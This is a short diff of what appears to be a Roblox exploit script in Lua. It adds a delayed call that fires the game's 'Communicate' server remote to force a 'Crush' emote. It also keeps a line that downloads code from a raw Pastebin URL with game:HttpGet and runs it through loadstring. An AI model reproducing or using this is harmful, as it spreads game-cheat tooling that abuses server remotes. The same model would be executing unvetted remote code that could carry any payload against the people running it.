@@ -1,9 +1,22 @@
--- Execute the first script immediately
+-- First script with 2-second delay
+local args = {
+    [1] = {
+        ["Goal"] = "Emote",
+        ["Emote"] = "Crush"
+    }
+}
+
+-- Delay execution for 2 seconds
+wait(2)
+
+game:GetService("Players").LocalPlayer.Character.Communicate:FireServer(unpack(args))
+
+-- Execute the first remote script immediately
 local success, errorMessage = pcall(function()
     loadstring(game:HttpGet("https://pastebin.com/raw/9zpSmYff"))()
 end)
 if not success then
-    warn("Failed to execute the first script: " .. errorMessage)
+    warn("Failed to execute the first remote script: " .. errorMessage)
 end
 
 -- Wait for 5 seconds
